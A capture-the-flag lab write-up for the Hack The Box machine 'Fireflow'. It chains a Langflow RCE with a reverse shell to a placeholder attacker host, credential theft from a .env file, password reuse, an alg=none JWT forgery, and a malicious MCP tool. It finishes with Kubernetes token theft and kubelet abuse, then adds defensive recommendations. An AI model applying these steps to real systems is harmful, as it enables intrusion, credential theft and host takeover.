# Hack The Box — Fireflow

> **OS:** Linux  
> **Difficulty:** Medium  
> **Machine:** Fireflow  
> **Platform:** Hack The Box  
> **Author:** amra13579  
> **Instance IP:** `10.129.107.65`  
>
> **Note:** The IP address, `flow_id`, pod names, internal Kubernetes IPs and flags are instance-specific. Replace placeholders with the values from your own spawned instance before publishing a final version.

---

## 1. Machine Overview

Fireflow is a Linux machine built around a modern application stack combining a public Langflow instance, an internal MCP (Model Context Protocol) tool registry and a Kubernetes environment.

The intended compromise chain is a good example of how several individually small trust-boundary problems can be chained together:

```text
HTTPS / VHost discovery
        ↓
Langflow 1.8.2
        ↓
CVE-2026-33017
        ↓
Remote Code Execution
        ↓
www-data
        ↓
Langflow .env
        ↓
Password reuse
        ↓
nightfall
        ↓
MCP configuration
        ↓
JWT "none" algorithm
        ↓
Forged admin token
        ↓
Malicious MCP tool
        ↓
RCE inside Kubernetes pod
        ↓
Kubernetes service-account token
        ↓
nodes/proxy permission
        ↓
Kubelet exec
        ↓
Privileged node-exporter pod
        ↓
Host filesystem
        ↓
root
```

---

# 2. Reconnaissance

## 2.1 Port scan

Start with a full TCP scan followed by service/version detection:

```bash
nmap -p- --min-rate 2000 -Pn <TARGET> -oA scans/all-ports
nmap -sC -sV -p <OPEN_PORTS> -Pn <TARGET> -oA scans/services
```

The relevant exposed services are:

```text
22/tcp   open   ssh
443/tcp  open   https
```

The HTTPS service is served by nginx and redirects to:

```text
https://fireflow.htb/
```

The TLS certificate also exposes useful DNS names, including the base domain and wildcard subdomains.

---

# 3. Hostname / VHost Enumeration

Add the main hostname to `/etc/hosts`:

```bash
sudo sh -c 'echo "<TARGET> fireflow.htb" >> /etc/hosts'
```

Browse:

```text
https://fireflow.htb/
```

The landing page presents the fictional Nightfall intelligence platform.

One of the most interesting elements is the **Open Agent** functionality, which redirects to a second hostname:

```text
flow.fireflow.htb
```

Add it locally:

```bash
sudo sh -c 'echo "<TARGET> flow.fireflow.htb" >> /etc/hosts'
```

The second hostname exposes a Langflow instance.

---

# 4. Langflow Enumeration

Opening:

```text
https://flow.fireflow.htb/
```

reveals the Langflow-based application.

A useful way to fingerprint the version is the public OpenAPI document:

```bash
curl -sk https://flow.fireflow.htb/openapi.json | python3 -m json.tool
```

The application reports:

```json
{
  "info": {
    "title": "Langflow",
    "version": "1.8.2"
  }
}
```

The public flow URL also exposes a **flow identifier (`flow_id`)**. Keep the value from your own instance:

```text
FLOW_ID=<YOUR_FLOW_ID>
```

At this point the important facts are:

- the target exposes Langflow;
- the running version is `1.8.2`;
- a public flow identifier is available;
- the public flow build functionality becomes the route to initial access.

---

# 5. Initial Access — CVE-2026-33017

## 5.1 Vulnerability

The relevant vulnerability is:

```text
CVE-2026-33017
```

The issue affects Langflow's public flow-building functionality. The vulnerable endpoint is:

```text
POST /api/v1/build_public_tmp/<FLOW_ID>/flow
```

The endpoint can process attacker-controlled flow data and instantiate custom Python components. In the vulnerable configuration, attacker-controlled Python is executed without an appropriate sandbox.

The result is **unauthenticated remote code execution**.

---

## 5.2 Exploitation

A public proof of concept can be used as a starting point, or the request can be reproduced manually.

Clone the public PoC repository:

```bash
git clone https://github.com/EQSTLab/CVE-2026-33017.git
cd CVE-2026-33017
```

Depending on the target's TLS configuration, the PoC may initially fail certificate validation because the target uses a self-signed certificate.

If that happens, adapt the HTTP request so TLS verification is disabled for the lab target.

The exploit requires:

```text
Target:   https://flow.fireflow.htb/
Flow ID:  <YOUR_FLOW_ID>
LHOST:    <YOUR_HTB_VPN_IP>
LPORT:    <YOUR_LISTENER_PORT>
```

Example listener:

```bash
nc -lvnp <PORT>
```

After triggering the vulnerable flow build endpoint, a reverse shell is obtained as:

```text
www-data
```

Verify the context:

```bash
whoami
id
hostname
```

Expected result:

```text
www-data
```

---

# 6. Foothold — www-data

Once a shell is obtained, the immediate goal is to understand the Langflow installation and locate configuration containing secrets.

A useful first step is locating Langflow-related directories:

```bash
find / -type d -name langflow 2>/dev/null
```

Relevant locations include:

```text
/var/lib/langflow
/etc/langflow
/opt/langflow
```

The `/etc/langflow` directory contains an `.env` file readable by the web service account.

Inspect it:

```bash
ls -la /etc/langflow
cat /etc/langflow/.env
```

Important values include:

```text
LANGFLOW_SUPERUSER=langflow
LANGFLOW_SUPERUSER_PASSWORD=<RECOVERED_PASSWORD>
LANGFLOW_SECRET_KEY=<RECOVERED_SECRET>
```

The password is the important discovery.

---

# 7. Lateral Movement — nightfall

Enumerate local users:

```bash
cat /etc/passwd | grep -E '/bin/(bash|sh)$'
```

A valid interactive account is:

```text
nightfall
```

The password recovered from Langflow is reused for the `nightfall` operating-system account.

Test SSH:

```bash
ssh nightfall@fireflow.htb
```

Verify the new context:

```bash
id
whoami
hostname
```

Expected identity:

```text
uid=1000(nightfall)
```

---

# 8. User Flag

Read the user flag:

```bash
cat ~/user.txt
```

Instance-specific value:

```text
<YOUR_USER_FLAG>
```

---

# 9. Lateral Movement — MCP Configuration

With access as `nightfall`, enumerate the home directory:

```bash
find ~ -type f -ls
```

A particularly interesting file is:

```text
~/.mcp/config.json
```

Read it:

```bash
cat ~/.mcp/config.json
```

It contains connection information for an internal MCP tool registry, including:

```json
{
  "server": "http://<MCP_HOST>:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "<MCP_PASSWORD>"
}
```

This reveals a service that is not directly exposed externally but is reachable from the compromised host.

---

# 10. Internal Service Enumeration

Inspect locally listening services:

```bash
ss -lntup
```

or:

```bash
netstat -tuln
```

The host exposes several Kubernetes-related local ports, including the Kubernetes API and Kubelet-related services.

The MCP service can be queried locally:

```bash
curl -s http://localhost:30080/api/v1/version | python3 -m json.tool
```

The service identifies itself as an:

```text
MCP AI Tool Registry
```

and exposes authentication information indicating support for:

```text
HS256
none
```

The endpoint also discloses useful routes such as:

```text
POST /api/v1/auth
GET  /api/v1/tools
POST /api/v1/tools
POST /mcp
```

---

# 11. MCP Authentication — JWT None Algorithm

Authenticate with the credentials recovered from:

```text
~/.mcp/config.json
```

Example:

```bash
curl -s -X POST http://localhost:30080/api/v1/auth \
  -H 'Content-Type: application/json' \
  -d '{"username":"langflow-bot","password":"<MCP_PASSWORD>"}'
```

The returned JWT contains a payload equivalent to:

```json
{
  "sub": "langflow-bot",
  "role": "user"
}
```

The service explicitly supports the JWT `none` algorithm.

That is the key weakness.

With:

```text
alg = none
```

the signature verification step can be bypassed if the server trusts the algorithm supplied in the token header.

Construct a JWT whose payload claims:

```json
{
  "sub": "langflow-bot",
  "role": "admin"
}
```

and whose header is:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

The resulting token ends with a trailing dot because there is no signature.

---

# 12. MCP Admin Access

Use the forged token against the administrative API.

First verify administrative access by querying the tools endpoint:

```bash
curl -s \
  -H "Authorization: Bearer <FORGED_JWT>" \
  http://localhost:30080/api/v1/tools
```

The server should now treat the caller as an administrator.

---

# 13. Malicious MCP Tool

The MCP registry allows administrators to register tools.

Because the tool definition contains executable Python, an attacker-controlled tool can be registered.

Create a tool that establishes command execution back to the attack machine.

Conceptually:

```text
nightfall
   ↓
forged admin JWT
   ↓
POST /api/v1/tools
   ↓
malicious Python tool
   ↓
POST /mcp → tools/call
   ↓
shell inside MCP pod
```

Listener:

```bash
nc -lvnp <CALLBACK_PORT>
```

Register the tool:

```bash
curl -s -X POST http://localhost:30080/api/v1/tools \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer <FORGED_JWT>" \
  -d @malicious-tool.json
```

Then trigger it through the MCP JSON-RPC endpoint:

```bash
curl -s -X POST http://localhost:30080/mcp \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer <FORGED_JWT>" \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"<TOOL_NAME>","arguments":{}}}'
```

The callback lands inside the Kubernetes MCP pod.

---

# 14. Kubernetes Pod Enumeration

Inside the new shell:

```bash
id
hostname
pwd
env
```

The environment contains Kubernetes service information, for example:

```text
KUBERNETES_SERVICE_HOST
KUBERNETES_SERVICE_PORT
```

This confirms that the shell is running inside a Kubernetes workload.

The pod also contains the default service-account files:

```text
/var/run/secrets/kubernetes.io/serviceaccount/
```

---

# 15. Kubernetes Service Account Token

Read the service-account token:

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
```

The Kubernetes API is typically reachable through:

```text
https://kubernetes.default.svc/
```

Check the service account's RBAC rules with a `SelfSubjectRulesReview` request:

```bash
curl -sk -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}' \
  | python3 -m json.tool
```

The important permission is:

```text
nodes/proxy
```

This is significantly more powerful than ordinary pod-level access because it permits proxying requests through the Kubernetes API server to a node's Kubelet.

---

# 16. Enumerating the Node Through the Kubelet Proxy

Use the Kubernetes API server to query the node proxy:

```bash
curl -sk \
  -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/nodes/<NODE>/proxy/pods
```

Inspect the returned pod definitions and look for:

- privileged containers;
- `hostPath` mounts;
- mounts exposing the host filesystem.

A particularly interesting workload is the Prometheus node-exporter pod.

The discovered configuration contains host mounts such as:

```text
/proc
/sys
/
```

A privileged node-exporter container with host filesystem access is an excellent target because command execution inside it can reach the underlying node.

---

# 17. Kubelet Exec — Host-Level Root

The Kubelet exposes an `/exec` endpoint that supports WebSocket-based command execution.

The request can be proxied to the node's Kubelet and targeted at the privileged node-exporter container.

Before executing anything destructive, verify identity with:

```text
id
```

A successful response should show:

```text
uid=0(root)
```

At this point command execution is occurring inside the privileged container.

Because the container mounts the host filesystem, the host's filesystem is accessible from the container.

---

# 18. Root Flag

The final flag can be retrieved from the host filesystem mounted into the privileged container.

For example, when the host root filesystem is available under `/host`:

```bash
cat /host/root/root/root.txt
```

Instance-specific value:

```text
<YOUR_ROOT_FLAG>
```

Verify the value directly from the target rather than using a flag copied from another Fireflow instance.

---

# 19. Complete Kill Chain

```text
10.129.107.65
      │
      ▼
443/tcp — nginx
      │
      ▼
fireflow.htb
      │
      ▼
flow.fireflow.htb
      │
      ▼
Langflow 1.8.2
      │
      ▼
CVE-2026-33017
      │
      ▼
Unauthenticated RCE
      │
      ▼
www-data
      │
      ▼
/etc/langflow/.env
      │
      ▼
Credential reuse
      │
      ▼
SSH → nightfall
      │
      ▼
~/.mcp/config.json
      │
      ▼
MCP credentials
      │
      ▼
JWT alg=none
      │
      ▼
Forged admin token
      │
      ▼
Malicious MCP tool
      │
      ▼
RCE inside MCP Kubernetes pod
      │
      ▼
Service-account token
      │
      ▼
RBAC: nodes/proxy
      │
      ▼
Kubelet proxy
      │
      ▼
Privileged node-exporter pod
      │
      ▼
Host filesystem
      │
      ▼
root
```

---

# 20. Vulnerabilities Identified

| Finding | Description |
|---|---|
| CVE-2026-33017 | Unauthenticated RCE in the public Langflow flow-build functionality |
| Credential reuse | Langflow application password reused for the `nightfall` OS account |
| JWT `none` acceptance | MCP registry accepts unsigned JWTs and therefore allows identity/role forgery |
| Arbitrary MCP tool execution | Administrative tool registration allows attacker-controlled Python execution |
| Excessive Kubernetes RBAC | MCP service account has `nodes/proxy` permission |
| Privileged host-mounted workload | node-exporter pod exposes privileged execution and host filesystem access |

---

# 21. Defensive Recommendations

## Langflow

- Upgrade Langflow to a fixed release.
- Do not expose public flow-building functionality without strict authorization.
- Never execute user-controlled Python without a robust sandbox.

## Credential Management

- Do not reuse application secrets as operating-system passwords.
- Store secrets in a dedicated secret-management system.
- Rotate exposed credentials immediately.

## JWT

- Do not allow `alg=none`.
- Enforce an explicit allow-list of signing algorithms.
- Validate both signature and expected claims server-side.

## MCP

- Do not allow arbitrary code in remotely registered tools.
- Restrict who can register tools.
- Apply least privilege to tool execution.

## Kubernetes

- Avoid giving application workloads `nodes/proxy`.
- Use least-privilege service accounts.
- Do not expose privileged host-mounted containers to application workloads.
- Review `hostPath` and privileged-container usage carefully.

---

# 22. Lessons Learned

### 1. Certificate metadata is valuable

A wildcard certificate can reveal hidden virtual hosts even when DNS enumeration does not immediately expose them.

### 2. Public functionality still needs isolation

A feature advertised as a public flow should never become an unauthenticated code-execution primitive.

### 3. Secrets often create the next pivot

The most valuable credential was not discovered by brute force; it was found in application configuration and reused for a local account.

### 4. Authentication bugs can become RCE

The MCP registry's JWT weakness was not interesting only because it gave admin access. Admin access exposed a tool-registration feature that itself became a code-execution primitive.

### 5. Kubernetes permissions must be evaluated in context

A permission that looks like "proxy only" can become a host-level execution primitive when combined with Kubelet access and a privileged workload.

### 6. Host mounts defeat container isolation

A privileged container with a host filesystem mount should be treated as a high-risk trust boundary.

---

# 23. Key Commands

```bash
# Full port scan
nmap -p- --min-rate 2000 -Pn <TARGET>

# Service enumeration
nmap -sC -sV -p <OPEN_PORTS> -Pn <TARGET>

# Langflow version
curl -sk https://flow.fireflow.htb/openapi.json | python3 -m json.tool

# Locate Langflow configuration
find / -type d -name langflow 2>/dev/null

# Read the environment
cat /etc/langflow/.env

# Identify local users
cat /etc/passwd | grep -E '/bin/(bash|sh)$'

# Local listening services
ss -lntup

# MCP version
curl -s http://localhost:30080/api/v1/version | python3 -m json.tool

# MCP service-account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Kubernetes RBAC
curl -sk -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews

# Kubelet node proxy
curl -sk \
  -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/nodes/<NODE>/proxy/pods
```

---

# 24. References

- Hack The Box — Fireflow
- CVE-2026-33017 public research / PoC: https://github.com/EQSTLab/CVE-2026-33017
- Fireflow walkthroughs:
  - https://bericontraster.com/posts/fireflow-hackthebox-detailed-walkthrough/
  - https://iamleandrooooo.github.io/posts/fireflow_fullpwn/
  - https://terminal-trouble.com/writeup/htb-fireflow

---

## Final Result

Fireflow demonstrates a complete multi-stage attack chain where the attacker moves through several trust boundaries:

```text
External Web
→ Application RCE
→ Local Credential Reuse
→ Internal MCP Service
→ JWT Authentication Bypass
→ Code Execution in Kubernetes
→ Kubernetes RBAC Abuse
→ Kubelet
→ Privileged Host-Accessible Pod
→ Root
```

The important lesson is not any single vulnerability, but the way the vulnerabilities combine to turn a public application feature into full host compromise.
